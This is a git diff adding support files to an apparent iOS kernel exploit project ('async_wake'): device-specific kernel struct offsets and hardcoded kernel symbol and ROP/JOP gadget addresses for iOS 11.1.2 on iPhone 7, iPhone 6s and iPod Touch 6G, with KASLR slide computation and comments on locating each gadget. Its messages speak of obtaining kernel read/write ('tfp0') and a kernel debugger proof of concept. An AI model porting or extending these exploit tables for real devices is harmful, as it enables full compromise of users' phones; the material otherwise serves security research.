+++ b/async_wake_ios/main.m
@@ -0,0 +1,8 @@
+#import <UIKit/UIKit.h>
+#import "AppDelegate.h"
+
+int main(int argc, char * argv[]) {
+  @autoreleasepool {
+      return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
+  }
+}
diff --git a/async_wake_ios/symbols.c b/async_wake_ios/symbols.c
new file mode 100644
index 0000000..91655f4
--- /dev/null
+++ b/async_wake_ios/symbols.c
@@ -0,0 +1,205 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/sysctl.h>
+#include <sys/utsname.h>
+
+#include "symbols.h"
+#include "kmem.h"
+#include "kutils.h"
+
+// the offsets are unlikely to change between similar models and builds, but the symbol addresses will
+// the offsets are required to get the kernel r/w but the symbols aren't
+
+int* offsets = NULL;
+
+
+/* iOS 11.1.2 */
+int kstruct_offsets_15B202[] = {
+  0xb,   // KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE,
+  0x10,  // KSTRUCT_OFFSET_TASK_REF_COUNT,
+  0x14,  // KSTRUCT_OFFSET_TASK_ACTIVE,
+  0x20,  // KSTRUCT_OFFSET_TASK_VM_MAP,
+  0x28,  // KSTRUCT_OFFSET_TASK_NEXT,
+  0x30,  // KSTRUCT_OFFSET_TASK_PREV,
+  0x308, // KSTRUCT_OFFSET_TASK_ITK_SPACE
+  0x368, // KSTRUCT_OFFSET_TASK_BSD_INFO,
+  
+  0x0,   // KSTRUCT_OFFSET_IPC_PORT_IO_BITS,
+  0x4,   // KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES,
+  0x40,  // KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE,
+  0x50,  // KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT,
+  0x60,  // KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER,
+  0x68,  // KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT,
+  0x90,  // KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT,
+  0xa0,  // KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS,
+  
+  0x10,  // KSTRUCT_OFFSET_PROC_PID,
+  
+  0x20,  // KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE
+  
+  0x180, // KSTRUCT_OFFSET_THREAD_BOUND_PROCESSOR
+  0x188, // KSTRUCT_OFFSET_THREAD_LAST_PROCESSOR
+  0x190, // KSTRUCT_OFFSET_THREAD_CHOSEN_PROCESSOR
+  0x408, // KSTRUCT_OFFSET_THREAD_CONTEXT_DATA
+  0x410, // KSTRUCT_OFFSET_THREAD_UPCB
+  0x418, // KSTRUCT_OFFSET_THREAD_UNEON
+  0x420, // KSTRUCT_OFFSET_THREAD_KSTACKPTR
+  
+  0x54,  // KSTRUCT_OFFSET_PROCESSOR_CPU_ID
+  
+  0x28,  // KSTRUCT_OFFSET_CPU_DATA_EXCEPSTACKPTR
+  0X78,  // KSTRUCT_OFFSET_CPU_DATA_CPU_PROCESSOR
+};
+
+int koffset(enum kstruct_offset offset) {
+  if (offsets == NULL) {
+    printf("need to call symbols_init() prior to querying offsets\n");
+    return 0;
+  }
+  return offsets[offset];
+}
+
+// this is the base of the kernel, not the kernelcache
+uint64_t kernel_base = 0;
+uint64_t* symbols = NULL;
+uint64_t kaslr_slide = 0;
+
+// ip7
+uint64_t ksymbols_iphone_7_15B202[] = {
+  0xfffffff0074d74cc, // KSYMBOL_OSARRAY_GET_META_CLASS,
+  0xfffffff007566454, // KSYMBOL_IOUSERCLIENT_GET_META_CLASS
+  0xfffffff007567bfc, // KSYMBOL_IOUSERCLIENT_GET_TARGET_AND_TRAP_FOR_INDEX
+  0xfffffff0073eb130, // KSYMBOL_CSBLOB_GET_CD_HASH
+  0xfffffff007101248, // KSYMBOL_KALLOC_EXTERNAL
+  0xfffffff007101278, // KSYMBOL_KFREE
+  0xfffffff0074d74d4, // KYSMBOL_RET
+  0xfffffff0074f11cc, // KSYMBOL_OSSERIALIZER_SERIALIZE,
+  0xfffffff00758c618, // KSYMBOL_KPRINTF
+  0xfffffff0074fc164, // KSYMBOL_UUID_COPY
+  0xfffffff0075b2000, // KSYMBOL_CPU_DATA_ENTRIES
+  0xfffffff0070cc1d4, // KSYMBOL_VALID_LINK_REGISTER
+  0xfffffff0070cc1ac, // KSYMBOL_X21_JOP_GADGET
+  0xfffffff0070cc474, // KSYMBOL_EXCEPTION_RETURN
+  0xfffffff0070cc42c, // KSYMBOL_THREAD_EXCEPTION_RETURN
+  0xfffffff0071e1998, // KSYMBOL_SET_MDSCR_EL1_GADGET
+  0xfffffff007439b20, // KSYMBOL_WRITE_SYSCALL_ENTRYPOINT // this is actually 1 instruction in to the entrypoint
+  0xfffffff0071de074, // KSYMBOL_EL1_HW_BP_INFINITE_LOOP
+  0xfffffff0071dea24, // KSYMBOL_SLEH_SYNC_EPILOG
+};
+
+uint64_t ksymbols_ipod_touch_6g_15b202[] = {
+  0xFFFFFFF0074A4A4C, // KSYMBOL_OSARRAY_GET_META_CLASS,
+  0xFFFFFFF007533CF8, // KSYMBOL_IOUSERCLIENT_GET_META_CLASS
+  0xFFFFFFF0075354A0, // KSYMBOL_IOUSERCLIENT_GET_TARGET_AND_TRAP_FOR_INDEX
+  0xFFFFFFF0073B71E4, // KSYMBOL_CSBLOB_GET_CD_HASH
+  0xFFFFFFF0070C8710, // KSYMBOL_KALLOC_EXTERNAL
+  0xFFFFFFF0070C8740, // KSYMBOL_KFREE
+  0xFFFFFFF0070C873C, // KYSMBOL_RET
+  0xFFFFFFF0074BE978, // KSYMBOL_OSSERIALIZER_SERIALIZE,
+  0xFFFFFFF007559FD0, // KSYMBOL_KPRINTF
+  0xFFFFFFF0074C9910, // KSYMBOL_UUID_COPY
+  0xFFFFFFF00757E000, // KSYMBOL_CPU_DATA_ENTRIES         // 0x6000 in to the data segment
+  0xFFFFFFF00709818C, // KSYMBOL_VALID_LINK_REGISTER      // look for reference to  FAR_EL1 (Fault Address Register (EL1))
+  0xFFFFFFF007098164, // KSYMBOL_X21_JOP_GADGET           // look for references to FPCR (Floating-point Control Register)
+  0xFFFFFFF007098434, // KSYMBOL_EXCEPTION_RETURN         // look for references to Set PSTATE.DAIF [--IF]
+  0xFFFFFFF0070983E4, // KSYMBOL_THREAD_EXCEPTION_RETURN  // a bit before exception_return
+  0xFFFFFFF0071AD144, // KSYMBOL_SET_MDSCR_EL1_GADGET     // look for references to MDSCR_EL1
+  0xFFFFFFF0074062F4, // KSYMBOL_WRITE_SYSCALL_ENTRYPOINT // look for references to enosys to find the syscall table (this is actually 1 instruction in to the entrypoint)
+  0xFFFFFFF0071A90C0, // KSYMBOL_EL1_HW_BP_INFINITE_LOOP  // look for xrefs to "ESR (0x%x) for instruction trapped" and find switch case 49
+  0xFFFFFFF0071A9ABC, // KSYMBOL_SLEH_SYNC_EPILOG         // look for xrefs to "Unsupported Class %u event code."
+};
+
+uint64_t ksymbols_iphone_6s_15b202[] = {
+  0xFFFFFFF00748D548, // KSYMBOL_OSARRAY_GET_META_CLASS,
+  0xFFFFFFF00751C4D0, // KSYMBOL_IOUSERCLIENT_GET_META_CLASS
+  0xFFFFFFF00751DC78, // KSYMBOL_IOUSERCLIENT_GET_TARGET_AND_TRAP_FOR_INDEX
+  0xFFFFFFF0073A1054, // KSYMBOL_CSBLOB_GET_CD_HASH
+  0xFFFFFFF0070B8088, // KSYMBOL_KALLOC_EXTERNAL
+  0xFFFFFFF0070B80B8, // KSYMBOL_KFREE
+  0xFFFFFFF0070B80B4, // KYSMBOL_RET
+  0xFFFFFFF0074A7248, // KSYMBOL_OSSERIALIZER_SERIALIZE,
+  0xFFFFFFF0075426C4, // KSYMBOL_KPRINTF
+  0xFFFFFFF0074B21E0, // KSYMBOL_UUID_COPY
+  0xFFFFFFF007566000, // KSYMBOL_CPU_DATA_ENTRIES         // 0x6000 in to the data segment
+  0xFFFFFFF00708818C, // KSYMBOL_VALID_LINK_REGISTER      // look for reference to  FAR_EL1 (Fault Address Register (EL1))
+  0xFFFFFFF007088164, // KSYMBOL_X21_JOP_GADGET           // look for references to FPCR (Floating-point Control Register)
+  0xFFFFFFF007088434, // KSYMBOL_EXCEPTION_RETURN         // look for references to Set PSTATE.DAIF [--IF]
+  0xFFFFFFF0070883E4, // KSYMBOL_THREAD_EXCEPTION_RETURN  // a bit before exception_return
+  0xFFFFFFF007197AB0, // KSYMBOL_SET_MDSCR_EL1_GADGET     // look for references to MDSCR_EL1
+  0xFFFFFFF0073EFB44, // KSYMBOL_WRITE_SYSCALL_ENTRYPOINT // look for references to enosys to find the syscall table (this is actually 1 instruction in to the entrypoint)
+  0xFFFFFFF0071941D8, // KSYMBOL_EL1_HW_BP_INFINITE_LOOP  // look for xrefs to "ESR (0x%x) for instruction trapped" and find switch case 49
+  0xFFFFFFF007194BBC, // KSYMBOL_SLEH_SYNC_EPILOG         // look for xrefs to "Unsupported Class %u event code."
+};
+
+uint64_t ksym(enum ksymbol sym) {
+  if (kernel_base == 0) {
+    if (!have_kmem_read()) {
+      printf("attempted to use symbols prior to gaining kernel read\n");
+      return 0;
+    }
+    kernel_base = find_kernel_base();
+    kaslr_slide = find_kernel_base() - 0xFFFFFFF007004000;
+  }
+  //return symbols[sym] + kernel_base;
+  return symbols[sym] + kaslr_slide;
+}
+
+int have_syms = 0;
+int probably_have_correct_symbols() {
+  return have_syms;
+}
+
+void offsets_init() {
+  size_t size = 32;
+  char build_id[size];
+  memset(build_id, 0, size);
+  int err = sysctlbyname("kern.osversion", build_id, &size, NULL, 0);
+  if (err == -1) {
+    printf("failed to detect version (sysctlbyname failed\n");
+    return;
+  }
+  printf("build_id: %s\n", build_id);
+  
+  struct utsname u = {0};
+  uname(&u);
+  
+  printf("sysname: %s\n", u.sysname);
+  printf("nodename: %s\n", u.nodename);
+  printf("release: %s\n", u.release);
+  printf("version: %s\n", u.version);
+  printf("machine: %s\n", u.machine);
+  
+  // set the offsets
+  
+  if (strcmp(build_id, "15B202") == 0) {
+    offsets = kstruct_offsets_15B202;
+  } else {
+    offsets = kstruct_offsets_15B202;
+    printf("unknown kernel build. If this is iOS 11 it might still be able to get tfp0, trying anyway\n");
+    have_syms = 0;
+    return;
+  }
+  
+  // set the symbols
+  
+  if (strstr(u.machine, "iPod7,1")) {
+    printf("this is iPod Touch 6G, should work!\n");
+    symbols = ksymbols_ipod_touch_6g_15b202;
+    have_syms = 1;
+  } else if (strstr(u.machine, "iPhone9,3")) {
+    printf("this is iPhone 7, should work!\n");
+    symbols = ksymbols_iphone_7_15B202;
+    have_syms = 1;
+  } else if (strstr(u.machine, "iPhone8,1")) {
+    printf("this is iPhone 6s, should work!\n");
+    symbols = ksymbols_iphone_6s_15b202;
+    have_syms = 1;
+  } else {
+    printf("no symbols for this device yet\n");
+    printf("tfp0 should still work, but the kernel debugger PoC won't\n");
+    symbols = NULL;
+    have_syms = 0;
+  }
+}
+
+
diff --git a/async_wake_ios/symbols.h b/async_wake_ios/symbols.h
new file mode 100644
index 0000000..89ef6ca
--- /dev/null
+++ b/async_wake_ios/symbols.h
@@ -0,0 +1,84 @@
+#ifndef symbols_h
+#define symbols_h
+
+#include <stdio.h>
+
+enum kstruct_offset {
+  /* struct task */
+  KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE,
+  KSTRUCT_OFFSET_TASK_REF_COUNT,
+  KSTRUCT_OFFSET_TASK_ACTIVE,
+  KSTRUCT_OFFSET_TASK_VM_MAP,
+  KSTRUCT_OFFSET_TASK_NEXT,
+  KSTRUCT_OFFSET_TASK_PREV,
+  KSTRUCT_OFFSET_TASK_ITK_SPACE,
+  KSTRUCT_OFFSET_TASK_BSD_INFO,
+  
+  /* struct ipc_port */
+  KSTRUCT_OFFSET_IPC_PORT_IO_BITS,
+  KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES,
+  KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE,
+  KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT,
+  KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER,
+  KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT,
+  KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT,
+  KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS,
+  
+  /* struct proc */
+  KSTRUCT_OFFSET_PROC_PID,
+  
+  /* struct ipc_space */
+  KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE,
+  
+  /* struct thread */
+  KSTRUCT_OFFSET_THREAD_BOUND_PROCESSOR,
+  KSTRUCT_OFFSET_THREAD_LAST_PROCESSOR,
+  KSTRUCT_OFFSET_THREAD_CHOSEN_PROCESSOR,
+  KSTRUCT_OFFSET_THREAD_CONTEXT_DATA,     // thread.machine.contextData
+  KSTRUCT_OFFSET_THREAD_UPCB,             // thread.machine.upcb
+  KSTRUCT_OFFSET_THREAD_UNEON,            // thread.machine.uNeon
+  KSTRUCT_OFFSET_THREAD_KSTACKPTR,
+  
+  /* struct processor */
+  KSTRUCT_OFFSET_PROCESSOR_CPU_ID,
+  
+  /* struct cpu_data */
+  KSTRUCT_OFFSET_CPU_DATA_EXCEPSTACKPTR,  // despite the name this actually points to the top of the stack, not the bottom
+  KSTRUCT_OFFSET_CPU_DATA_CPU_PROCESSOR,
+};
+
+
+
+// the
+
+enum ksymbol {
+  KSYMBOL_OSARRAY_GET_META_CLASS,
+  KSYMBOL_IOUSERCLIENT_GET_META_CLASS,
+  KSYMBOL_IOUSERCLIENT_GET_TARGET_AND_TRAP_FOR_INDEX,
+  KSYMBOL_CSBLOB_GET_CD_HASH,
+  KSYMBOL_KALLOC_EXTERNAL,
+  KSYMBOL_KFREE,
+  KSYMBOL_RET,
+  KSYMBOL_OSSERIALIZER_SERIALIZE,
+  KSYMBOL_KPRINTF,
+  KSYMBOL_UUID_COPY,
+  KSYMBOL_CPU_DATA_ENTRIES,
+  KSYMBOL_VALID_LINK_REGISTER,
+  KSYMBOL_X21_JOP_GADGET,
+  KSYMBOL_EXCEPTION_RETURN,
+  KSYMBOL_THREAD_EXCEPTION_RETURN,
+  KSYMBOL_SET_MDSCR_EL1_GADGET,
+  KSYMBOL_WRITE_SYSCALL_ENTRYPOINT,
+  KSYMBOL_EL1_HW_BP_INFINITE_LOOP,
+  KSYMBOL_SLEH_SYNC_EPILOG
+};
+
+int koffset(enum kstruct_offset);
+
+uint64_t ksym(enum ksymbol);
+
+void offsets_init(void);
+void symbols_init(void);
+int probably_have_correct_symbols(void);
+
+#endif
--
Working Copy 3.1.9

